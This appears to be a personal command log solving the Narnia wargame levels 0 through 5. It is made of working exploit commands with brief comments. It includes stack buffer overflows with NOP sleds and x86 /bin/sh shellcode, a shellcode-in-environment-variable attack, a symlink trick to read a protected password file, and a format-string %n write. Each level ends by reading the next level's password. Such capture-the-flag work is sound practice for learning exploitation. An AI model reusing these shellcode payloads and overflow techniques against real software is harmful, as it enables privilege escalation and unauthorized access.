# narnia 0 -> narnia 1
file narnia0
file narnia0.c
vim narnia0.c
mkdir /tmp/zulu
cd /tmp/zulu
# After several tries, seems we need to use echo chained with cat to pass correct val in hex dump transl. to narnia0 executable to 1. open shell with narnia1 perm and 2. keep shel open
( echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat; ) | /narnia/narnia0
whoami
cat /etc/narnia_pass/narnia0

# narnia 1 -> narnia 2
vim narnia1.c
./narnia1
export EGG=az
echo $EGG
./narnia1
gdb narnia1
disassemble main
break *0x080484b6
run
x/25x $eax
q
# Here we need to find the correct shell code. A lot of them are referenced at shell-storm.org
export EGG=$(python -c 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
./narnia1
whoami
id
cat /etc/narnia_pass/narnia2

# narnia 2 -> narnia 3
vim narnia2.c
ltrace ./narnia2.c 
ltrace ./narnia2.c $(python -c 'print "A"*128')
ltrace ./narnia2.c $(python -c 'print "A"*132')
gdb -q ./narnia2
set disassembly-flavor intel
disassemble main
break *0x0804849c
r $(python -c 'print "A"*132 + "B"*4')
c
# Go to shell-code.org and find a shell code for x86
r $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
c
# find memory adress with 90's
x/300wx $esp
r $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
c
q
./narnia2 $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
whoami
cat /etc/narnia_pass/narnia3

# narnia3 -> narnia4
vim narnia3.c
mkdir $(python -c 'print "/tmp/" + "A"*27 + "/tmp"')
cd $(python -c 'print "/tmp/" + "A"*27 + "/tmp"')
objdump -d -M /narnia/narnia3
ln -s /etc/narnia_pass/narnia4 output
touch /tmp/output
chmod 777 /tmp/output
/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output


# narnia4 -> narnia5
vim narnia4.c
./narnia4
gdb narnia4
set disassembly-flavor intel
disassemble main
r $(python -c 'print "\x90"*300')
x/300wx $esp
r $(python -c 'print "\x90"*236 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
q
cd /tmp/zulu
/narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"') 
whoami
cat /etc/narnia_pass/narnia5

# narnia5 -> narnia6
vim narnia5.c
./narnia5 `python -c 'print "AAAA"+"%x."*5'`
./narnia5 `python -c 'print "\xd0\xd6\xff\xffAAAA"+"%n"'`
./narnia5 `python -c 'print "\xd0\xd6\xff\xff"+ "A" * 10+"%n"'`
./narnia5 `python -c 'print "\xd0\xd6\xff\xff"+ "A" * 492+"%n"'`
./narnia5 `python -c 'print "\xf0\xd4\xff\xff"+ "A" * 492+"%n"'`
./narnia5 `python -c 'print "\xf0\xd4\xff\xff"+ "A" * 496+"%n"'`
whoami
cat /etc/narnia_pass/narnia6











